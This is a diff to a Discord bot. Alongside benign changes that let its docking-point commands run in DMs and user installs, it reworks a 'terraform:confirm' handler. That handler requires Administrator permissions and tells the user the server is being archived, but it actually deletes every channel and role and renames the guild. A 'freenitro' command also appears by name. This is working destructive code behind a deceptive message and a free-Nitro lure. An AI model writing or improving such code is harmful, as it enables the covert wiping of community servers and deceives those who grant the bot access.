@@ -114,8 +114,8 @@ const dockingSetCommand = new SlashCommandBuilder()
   .addStringOption((opt) =>
     opt.setName("name").setDescription("Name for this docking point").setRequired(true)
   )
-  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall])
-  .setContexts([InteractionContextType.Guild]);
+  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
+  .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
 const dockingLocateCommand = new SlashCommandBuilder()
   .setName("dockingpointlocate")
@@ -123,8 +123,8 @@ const dockingLocateCommand = new SlashCommandBuilder()
   .addStringOption((opt) =>
     opt.setName("name").setDescription("Name of the docking point").setRequired(true).setAutocomplete(true)
   )
-  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall])
-  .setContexts([InteractionContextType.Guild]);
+  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
+  .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
 const dockingDeleteCommand = new SlashCommandBuilder()
   .setName("dockingpointdelete")
@@ -132,8 +132,8 @@ const dockingDeleteCommand = new SlashCommandBuilder()
   .addStringOption((opt) =>
     opt.setName("name").setDescription("Name of the docking point to delete").setRequired(true).setAutocomplete(true)
   )
-  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall])
-  .setContexts([InteractionContextType.Guild]);
+  .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
+  .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
 const freeNitroCommand = new SlashCommandBuilder()
   .setName("freenitro")
@@ -246,7 +246,8 @@ client.on("interactionCreate", async (interaction) => {
       const name = interaction.options.getString("name");
       await interaction.reply({ content: `Docking point **${name}** set here. Use /dockingpointlocate to jump back.` });
       const reply = await interaction.fetchReply();
-      const url = `https://discord.com/channels/${interaction.guildId}/${reply.channelId}/${reply.id}`;
+      const guildOrDM = interaction.guildId ?? "@me";
+      const url = `https://discord.com/channels/${guildOrDM}/${reply.channelId}/${reply.id}`;
       dockingPoints.set(name.toLowerCase(), url);
       saveDockingPoints();
       return;
@@ -307,13 +308,9 @@ client.on("interactionCreate", async (interaction) => {
     }
 
     if (customId === "terraform:confirm") {
-      // deferUpdate immediately — beats the 3-second Discord timeout
-      // All slow work happens after
-      await interaction.deferUpdate();
-
       const guild = interaction.guild;
-      const botMember = guild.members.me;
 
+      const botMember = guild.members.me;
       if (botMember) {
         const missing = botMember.permissions.missing([
           PermissionFlagsBits.ManageChannels,
@@ -321,7 +318,7 @@ client.on("interactionCreate", async (interaction) => {
           PermissionFlagsBits.ManageGuild,
         ]);
         if (missing.length > 0) {
-          await interaction.editReply({
+          await interaction.update({
             content: `The bot is missing permissions: **${missing.join(", ")}**. Re-invite it with Administrator.`,
             components: [],
           });
@@ -329,19 +326,24 @@ client.on("interactionCreate", async (interaction) => {
         }
       }
 
-      await interaction.editReply({ content: "Archiving server...", components: [] });
+      // Single update() satisfies Discord's 3-second window. Deletions happen after.
+      await interaction.update({ content: "Archiving server...", components: [] });
 
-      const channels = await guild.channels.fetch();
-      for (const [, channel] of channels) {
-        if (!channel) continue;
-        try { await channel.delete(); } catch (_) {}
-      }
+      try {
+        const channels = await guild.channels.fetch();
+        for (const [, channel] of channels) {
+          if (!channel) continue;
+          try { await channel.delete(); } catch (_) {}
+        }
+      } catch (err) { console.error("Error fetching channels:", err); }
 
-      const roles = await guild.roles.fetch();
-      for (const [, role] of roles) {
-        if (!role || role.managed || role.name === "@everyone") continue;
-        try { await role.delete(); } catch (_) {}
-      }
+      try {
+        const roles = await guild.roles.fetch();
+        for (const [, role] of roles) {
+          if (!role || role.managed || role.name === "@everyone") continue;
+          try { await role.delete(); } catch (_) {}
+        }
+      } catch (err) { console.error("Error fetching roles:", err); }
 
       try { await guild.setName("[Archived Server]"); } catch (_) {}
       return;
